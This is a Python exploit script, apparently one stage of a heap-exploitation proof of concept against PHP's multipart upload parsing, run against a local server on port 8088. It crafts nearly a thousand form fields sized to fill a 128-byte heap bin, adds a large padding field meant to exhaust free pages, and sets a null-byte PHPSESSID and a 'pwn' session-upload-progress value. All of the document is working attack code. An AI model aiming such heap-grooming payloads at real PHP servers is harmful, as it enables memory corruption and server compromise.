#!/usr/bin/env python3
"""A: N128 fields of 103B (fill 128B bin), rest 3000B, one last padding field
of H bytes (large/page allocation to exhaust free pages), then file.
usage: send_a_bin128_big.py N128 V H
"""
import socket,sys
N128=int(sys.argv[1]); V=int(sys.argv[2]); H=int(sys.argv[3]); N=997
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N-1):
    ln=103 if i<N128 else V
    parts.append({'name':'f%04d'%i,'data':b'A'*ln})
parts.append({'name':'bigpad','data':b'C'*H})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
